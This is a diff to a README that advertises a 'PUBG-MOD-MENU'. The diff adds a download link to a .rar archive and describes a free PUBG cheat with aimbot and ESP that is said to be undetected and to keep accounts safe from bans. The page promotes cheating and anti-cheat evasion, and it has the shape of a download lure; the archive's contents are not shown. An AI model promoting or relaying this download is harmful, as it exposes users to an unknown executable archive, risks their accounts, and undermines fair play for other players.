@@ -1,6 +1,6 @@
 # PUBG-MOD-MENU
 
-## [DOWLOAD](
+## [DOWLOAD](https://github.com/Lanfong/PUBG-MOD-MENU/releases/download/PUBG-MOD-MENU/PUBG-MOD-MENU.rar)
 
 Free PUBG PC Hack is a cheat for the Steam version of the game that brings you tons of features like Aimbot, ESP while being undetected and keeping your account safe from bans.
 
